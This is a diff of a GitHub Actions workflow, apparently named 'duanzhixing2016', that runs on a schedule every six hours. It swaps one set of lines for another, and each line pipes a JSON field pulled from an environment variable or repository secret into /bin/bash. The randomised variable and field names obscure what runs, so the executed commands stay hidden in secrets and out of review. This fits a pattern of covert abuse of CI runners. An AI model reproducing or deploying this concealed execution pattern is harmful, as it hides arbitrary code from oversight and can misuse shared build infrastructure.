@@ -1,8 +1,9 @@
 name: duanzhixing2016
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 5/6 * * *'
+    - cron: '43 5/6 * * *'
 
 jobs:
   build:
@@ -12,15 +13,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: duanzhixing2016
         env:
-          klr4: ${{ secrets.klr4 }}
+          tm09994: ${{ secrets.tm09994 }}
         run: |
-          echo $klr4 | jq -r .wzrqb043 | /bin/bash
-          echo $mi03537 | jq -r .i69354 | /bin/bash
-          echo $k03 | jq -r .kkx72 | /bin/bash
-          echo $jijw6263 | jq -r .flkz3014 | /bin/bash
-          echo $pkum5 | jq -r .hm6696 | /bin/bash
-          echo $rpze79815 | jq -r .m7 | /bin/bash
-          echo $vhtln141 | jq -r .n604 | /bin/bash
-          echo $t59 | jq -r .r9 | /bin/bash
-          echo $woi88725 | jq -r .lhqk65 | /bin/bash
+          echo $tm09994 | jq -r .qvfqu58 | /bin/bash
+          echo $ok81 | jq -r .yaluk622 | /bin/bash
+          echo $xd2286 | jq -r .wsdxl80 | /bin/bash
+          echo $r80 | jq -r .vhdfb59656 | /bin/bash
+          echo $sshny555 | jq -r .pe962 | /bin/bash
+          echo $mr933 | jq -r .b71 | /bin/bash
+          echo $ux98 | jq -r .lehw76 | /bin/bash
+          echo $tq01055 | jq -r .id51 | /bin/bash
+          echo $ku77948 | jq -r .lvp4633 | /bin/bash
+          echo $ufw2564 | jq -r .jjjcw73112 | /bin/bash
+          echo $whi70 | jq -r .inmp3 | /bin/bash
+          echo $pw0831 | jq -r .u4 | /bin/bash
 
